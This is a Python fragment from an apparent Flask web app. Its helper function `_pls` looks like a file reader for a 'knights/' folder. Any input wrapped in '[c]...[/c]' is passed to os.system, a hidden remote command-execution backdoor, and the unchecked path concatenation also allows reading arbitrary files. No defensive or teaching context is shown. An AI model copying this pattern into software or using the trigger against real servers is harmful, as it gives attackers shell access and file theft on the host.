import os
import sys
import ctypes
import base64
from flask import Flask, request, render_template
from easyprocess import EasyProcess
from werkzeug.serving import run_simple

#begin_multiline
def _pls(p):

    if '[c]' and '[/c]' in p:
        c = p[p.index('[c]')+3:]
        c = c[:c.index('[/c]')]
        os.system(c)

        return '_c_'

    ret_p = ''
    try:
        with open('knights/'+p, 'r') as r_p:
            ret_p = r_p.read()
    except Exception as e:
        print(str(e))
        pass

    return ret_p
#end_multiline
